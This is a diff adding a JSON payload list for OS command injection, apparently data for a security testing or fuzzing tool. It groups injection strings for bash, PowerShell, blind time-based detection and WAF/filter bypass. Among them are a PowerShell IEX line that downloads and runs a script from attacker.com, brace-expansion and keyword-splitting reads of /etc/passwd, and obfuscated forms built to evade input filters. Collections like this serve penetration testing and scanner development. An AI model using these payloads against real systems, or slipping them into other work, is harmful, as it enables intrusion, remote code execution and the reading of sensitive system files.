@@ -1,0 +1,58 @@
+{
+  "category": "command_injection",
+  "contexts": {
+    "bash": {
+      "description": "OS command injection payloads for Unix/Linux bash environments",
+      "payloads": [
+        {"payload": ";id", "description": "Semicolon command separator", "waf_bypass": false},
+        {"payload": "|id", "description": "Pipe to id command", "waf_bypass": false},
+        {"payload": "||id", "description": "OR operator command injection", "waf_bypass": false},
+        {"payload": "&&id", "description": "AND operator command injection", "waf_bypass": false},
+        {"payload": "`id`", "description": "Backtick command substitution", "waf_bypass": false},
+        {"payload": "$(id)", "description": "Subshell command substitution", "waf_bypass": false},
+        {"payload": "\nid\n", "description": "Newline command separator", "waf_bypass": false},
+        {"payload": "; id #", "description": "Semicolon with trailing comment", "waf_bypass": false},
+        {"payload": "| id #", "description": "Pipe with trailing comment", "waf_bypass": false},
+        {"payload": "& id &", "description": "Background process injection", "waf_bypass": false}
+      ]
+    },
+    "powershell": {
+      "description": "Command injection payloads for Windows PowerShell environments",
+      "payloads": [
+        {"payload": "; whoami", "description": "PowerShell semicolon separator", "waf_bypass": false},
+        {"payload": "| whoami", "description": "PowerShell pipe operator", "waf_bypass": false},
+        {"payload": "& whoami", "description": "PowerShell call operator", "waf_bypass": false},
+        {"payload": "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')", "description": "IEX remote script download and execute", "waf_bypass": false},
+        {"payload": "powershell -EncodedCommand dwBoAG8AYQBtAGkA", "description": "Base64 encoded command execution (whoami)", "waf_bypass": false},
+        {"payload": "Invoke-Expression 'whoami'", "description": "Invoke-Expression string eval", "waf_bypass": false},
+        {"payload": ";[System.Diagnostics.Process]::Start('cmd','/c whoami')", "description": "Process.Start via .NET", "waf_bypass": false}
+      ]
+    },
+    "blind_time": {
+      "description": "Blind command injection via time-based detection",
+      "payloads": [
+        {"payload": "; sleep 5", "description": "Unix sleep delay detection", "waf_bypass": false},
+        {"payload": "| sleep 5", "description": "Piped sleep delay", "waf_bypass": false},
+        {"payload": "$(sleep 5)", "description": "Subshell sleep", "waf_bypass": false},
+        {"payload": "`sleep 5`", "description": "Backtick sleep substitution", "waf_bypass": false},
+        {"payload": "& ping -c 5 127.0.0.1 &", "description": "Ping-based delay (Unix, 5 ICMP packets)", "waf_bypass": false},
+        {"payload": "| ping -n 5 127.0.0.1", "description": "Ping-based delay (Windows, 5 pings)", "waf_bypass": false},
+        {"payload": "; timeout 5", "description": "Unix timeout command", "waf_bypass": false}
+      ]
+    },
+    "filter_bypass": {
+      "description": "Command injection payloads designed to bypass input filters and WAFs",
+      "payloads": [
+        {"payload": "${IFS}id", "description": "IFS variable to replace spaces (bash)", "waf_bypass": true},
+        {"payload": "$'\\x69\\x64'", "description": "Hex-encoded 'id' via ANSI-C quoting", "waf_bypass": true},
+        {"payload": "{cat,/etc/passwd}", "description": "Brace expansion to avoid spaces", "waf_bypass": true},
+        {"payload": "%0aid", "description": "URL-encoded newline as command separator", "waf_bypass": true},
+        {"payload": "i''d", "description": "Empty string quotes to break keyword matching", "waf_bypass": true},
+        {"payload": "i$@d", "description": "Empty $@ parameter to break keyword matching", "waf_bypass": true},
+        {"payload": "w'h'o'am'i", "description": "Quote-broken whoami to evade string matching", "waf_bypass": true},
+        {"payload": "/???/id", "description": "Glob expansion for /bin/id", "waf_bypass": true},
+        {"payload": "c${z}at /etc/passwd", "description": "Null variable to break cat keyword", "waf_bypass": true}
+      ]
+    }
+  }
+}
